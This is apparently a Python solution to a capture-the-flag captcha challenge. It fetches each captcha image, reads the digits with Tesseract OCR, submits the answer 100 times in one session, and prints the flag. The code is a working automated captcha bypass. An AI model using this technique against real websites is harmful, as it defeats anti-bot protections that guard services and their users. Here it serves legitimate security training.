import requests
import pytesseract
from io import BytesIO
from PIL import Image
from bs4 import BeautifulSoup

url = "http://captcha.challs.olicyber.it/"

s = requests.Session()

r = s.get(url)

for i in range(100):
    print("---")
    print("Richiesta: " + str(i+1))

    soup = BeautifulSoup(r.text, "html.parser")

    # GET dell'immagine
    img = soup.find("img")["src"]
    r = s.get(url + img)
    img = Image.open(BytesIO(r.content))

    # Estrazione numeri dall'immagine
    nums = pytesseract.image_to_string(img).strip()
    print("Numero: " + nums)

    r = s.post(url + "next", data={"risposta" : nums})

soup = BeautifulSoup(r.text, "html.parser")
flag = soup.find("h1").text

print("\n" + flag)